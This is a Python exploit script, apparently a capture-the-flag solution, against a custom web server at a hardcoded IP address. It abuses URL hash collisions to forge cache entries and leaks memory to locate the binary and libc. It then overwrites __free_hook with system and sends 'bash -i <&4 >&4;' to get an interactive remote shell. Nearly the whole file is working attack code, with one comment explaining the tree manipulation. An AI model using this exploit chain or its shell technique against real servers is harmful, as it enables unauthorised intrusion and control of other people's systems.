#!/usr/bin/python
import struct
import socket
import telnetlib
import time

def readuntil(f, delim='\r\n\r\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

def req(f, url, headers=None):
    req = 'GET %s HTTP/1.0\r\n' % url
    if headers is not None:
        for k, v in headers.iteritems():
            req += '%s: %s\r\n' % (k, v)
    f.write(req + '\r\n')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.64.74.49', 6666))
f = s.makefile('rw', bufsize=0)

def url_hash(filename):
    h = 0
    for c in filename:
        h = ord(c) ^ (h << 3)
    return h & 0xffffffff

def suffix_for_hash(h):
    n = h
    suffix = ''
    for i in xrange(11):
        suffix = chr(n & 7) + suffix
        n >>= 3
    assert h == url_hash(suffix)
    return suffix

collision_value = 0x41414141
collision_suffix = suffix_for_hash(collision_value)
req(f, 'file://' + collision_suffix)
readuntil(f)

print 'Waiting for cache expiry.'
sleep_time = 31

for i in xrange(sleep_time):
    print '%d...' % i
    time.sleep(1)
print 'Done.'
req(f, 'invalid://' + collision_suffix)
readuntil(f)

def leak(f, addr):
    fake_cache_entry = ''
    fake_cache_entry += p(collision_value)
    fake_cache_entry += p(addr)
    fake_cache_entry += p(int(time.time() + 9))
    fake_cache_entry += p(0x43434343)
    fake_cache_entry += p(0x44444444)
    fake_cache_entry += p(0)

    req(f, 'invalid://' + collision_suffix, {'x': fake_cache_entry})

    fake_cache_entry = ''
    fake_cache_entry += p(collision_value - 1)
    fake_cache_entry += p(addr)
    fake_cache_entry += p(int(time.time() + 9))
    fake_cache_entry += p(0x43434343)
    fake_cache_entry += p(0x44444444)
    fake_cache_entry += p(0)
    req(f, 'invalid://' + collision_suffix, {'x': fake_cache_entry})
    req(f, 'invalid://' + collision_suffix, {'x': fake_cache_entry})
    return readuntil(f, 'HTTP/1.1 501 Not Implemented\r\n\r\n' * 2)

# From prior brute forcing - found it in <256 guesses :-)
search_base = 0xf77a5000

binary_base = None
for i in xrange(0, 256):
    candidate = search_base + i * 4096
    data = leak(f, candidate + 0x397C)
    print 'trying:', i, len(data)
    if data.startswith('/home/weff_webserver/webserver\0\0HTTP'):
        binary_base = candidate
        print 'binary_base =', hex(binary_base)
        break

cache_btree_addr = binary_base + 0x600C
cache_btree = u(leak(f, cache_btree_addr)[:4])
print 'cache_btree =', hex(cache_btree)

setsockopt_got = binary_base + 0x05F50
setsockopt = u(leak(f, setsockopt_got)[:4])

libc_base = setsockopt - 0xeaeb0
free_hook = libc_base + 0x1a78b8
system = libc_base + 0x3e360

print 'libc_base =', hex(libc_base)

def overwrite_zero(f, addr, value_at_ptr):
    suffix = suffix_for_hash(value_at_ptr)
    fake_cache_entry = ''
    fake_cache_entry += p(value_at_ptr - 1)
    fake_cache_entry += p(0xdeadbeef)
    fake_cache_entry += p(int(time.time() + 9))
    fake_cache_entry += p(0x43434343)
    fake_cache_entry += p(0x44444444)
    fake_cache_entry += p(addr - 0x14)
    req(f, 'file://' + suffix, {'x': fake_cache_entry})
    readuntil(f)

overwrite_zero(f, free_hook + 0x10, 0xdeadbeef)
overwrite_zero(f, free_hook + 0x14, system)

print 'About to delete'

zero_collision_suffix = '\x01\x08' * 6
assert url_hash(zero_collision_suffix) == 0

'''
On this request, the binary tree will look like this (hashes in
parentheses):

        (sh<&)
          /
     free_hook (0)
      /         \
(0xdeadbeef)   (system)

When free_hook is removed (by requesting a URI that hashes to 0), the
tree removal code will take the left-most element of the right subtree
of free_hook and overwrite the free_hook node with the contents of that
node.
'''

fake_cache_entry = ''
fake_cache_entry += p(0xdeadbeef)
fake_cache_entry += p(0xdeadbeef)
fake_cache_entry += p(int(time.time() - 60))
fake_cache_entry += p(0x43434343)
fake_cache_entry += p(free_hook)
fake_cache_entry += p(0x45454545)
req(f, 'file://' + zero_collision_suffix, {'sh<&4': fake_cache_entry})
readuntil(f)

cmd = 'bash -i <&4 >&4;'
f.write(cmd + '\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
